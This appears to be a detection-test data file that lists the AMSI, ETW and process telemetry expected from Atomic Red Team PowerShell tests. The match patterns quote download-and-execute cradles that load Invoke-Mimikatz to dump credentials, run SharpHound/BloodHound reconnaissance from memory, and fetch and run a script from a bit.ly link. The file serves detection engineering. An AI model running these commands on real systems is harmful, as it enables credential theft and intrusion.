T1059.001,windows,f3132740,Mimikatz
ARG,mimurl,https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
_E_,Process,cmdline~=powershell.exe IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds
_E_,AMSI,app_name~=PowerShell
_E_,AMSI,scan_content~=IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds

T1059.001,windows,a21bb23e,Run BloodHound from local disk
_E_,AMSI,app_name~=PowerShell
_E_,AMSI,scan_content*=.*import-module ".*atomics.*ExternalPayloads.*SharpHound.ps1"
_E_,AMSI,scan_content~=Invoke-BloodHound -OutputDirectory $env:Temp
_E_,AMSI,scan_content~=Start-Sleep 5
_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
_E_,ETW,event_msg~=Creating Scriptblock text
_E_,ETW,event_data_list*=.*import-module ".*atomics.*ExternalPayloads.*SharpHound.ps1"
_E_,ETW,event_data_list~=Invoke-BloodHound -OutputDirectory $env:Temp
_E_,ETW,event_data_list~=Start-Sleep 5

T1059.001,windows,bf8c1441,Run Bloodhound from Memory using Download Cradle
_E_,AMSI,app_name~=PowerShell
_E_,AMSI,scan_content~=write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
_E_,AMSI,scan_content~=IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
_E_,AMSI,scan_content~=Invoke-BloodHound -OutputDirectory $env:Temp
_E_,AMSI,scan_content~=Start-Sleep 5

T1059.001,windows,4297c41a,Obfuscation Tests
_E_,AMSI,app_name~=PowerShell
_E_,AMSI,scan_content~=(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
_E_,AMSI,scan_content~=(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
